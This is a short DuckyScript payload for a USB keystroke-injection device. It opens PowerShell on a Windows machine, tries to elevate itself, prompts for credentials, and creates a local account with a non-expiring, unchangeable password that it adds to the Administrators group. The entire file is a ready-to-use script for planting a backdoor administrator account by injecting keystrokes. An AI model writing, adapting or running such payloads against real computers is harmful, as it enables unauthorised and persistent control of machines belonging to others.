
REM Start powershell
GUI r
STRING powershell
ENTER

REM Check if user has admin rights
STRING if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-verb RunAs"; exit }
ENTER

REM Prompt for username and password
STRING $username = Read-Host 'Enter new username:'
ENTER
STRING $password = Read-Host 'Enter password:' -AsSecureString
ENTER

REM Create new user with admin privileges
STRING New-LocalUser -Name $username -Password $password -AccountNeverExpires $true -UserMayNotChangePassword $true
ENTER
STRING Add-LocalGroupMember -Group "Administrators" -Member $username
ENTER

REM Exit powershell
STRING exit
ENTER
